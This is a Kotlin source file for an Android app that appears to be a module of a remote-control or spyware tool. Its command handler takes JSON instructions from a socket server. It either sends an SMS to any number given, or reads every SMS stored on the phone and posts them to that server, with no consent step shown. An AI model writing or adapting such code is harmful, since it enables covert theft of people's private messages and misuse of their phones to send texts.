package com.hc.calling.commands.sms

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.telephony.SmsManager
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor
import com.hc.calling.commands.callingtransaction.CallingHistory

/**
 * Created by ChanHong on 2019/3/18
 *
 */
class Sms(context: Context) : Command(), Executor {

    private val mContext = context

    companion object {
        const val SMS_SEND_ACTION = "SMS_SEND_ACTION"
        const val SMS_DELIVER_ACTION = "SMS_DELIVER_ACTION"

        //sms command
        const val SEND_SMS_LIST = "send_sms_list"  //post the msg list
        const val SMS_LIST = "sms_list" //send a msg to someone

        private val sentIntent = Intent(SMS_SEND_ACTION)
        private val deliveryIntent = Intent(SMS_DELIVER_ACTION)
        /**
         * send a msg to destinationAddress
         */
        fun sendSms(context: Context, msg: String, destinationAddress: String) {
            val sentPIntent = PendingIntent.getBroadcast(
                context, 0,
                sentIntent, 0
            )
            val deliveryPItent = PendingIntent.getBroadcast(
                context, 0,
                deliveryIntent, 0
            )
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(destinationAddress, null, msg, sentPIntent, deliveryPItent)
        }
    }


    /**
     * post all sms as json to the socket server
     */
    override fun execute(data: Array<Any>) {
        com.orhanobut.logger.Logger.i(data[0].toString())
        Gson().fromJson(data[0].toString(), DestinationDTO::class.java)
            .let {
                if (it != null && it.notNull()) {
                    sendSms(mContext, it.content, it.address)
                    emitData(SMS_LIST, "send success")
                } else {
                    return@let false
                }
                return@let true
            }.apply {
                if (!this) {
                    val data1 = Gson().toJson(CallingHistory.getSmsFromPhone(mContext))
                    emitData(SMS_LIST, data1)
                }

            }

    }


    /**
     * register the msg send callback
     */
    private fun registerCallBack(action: String): Sms {
        mContext.registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
            }
        }, IntentFilter(action))

        return this
    }

    data class DestinationDTO(
        var address: String = "",
        var content: String = ""
    ) {
        fun notNull(): Boolean {
            return address.isNotBlank() && content.isNotBlank()
        }
    }
}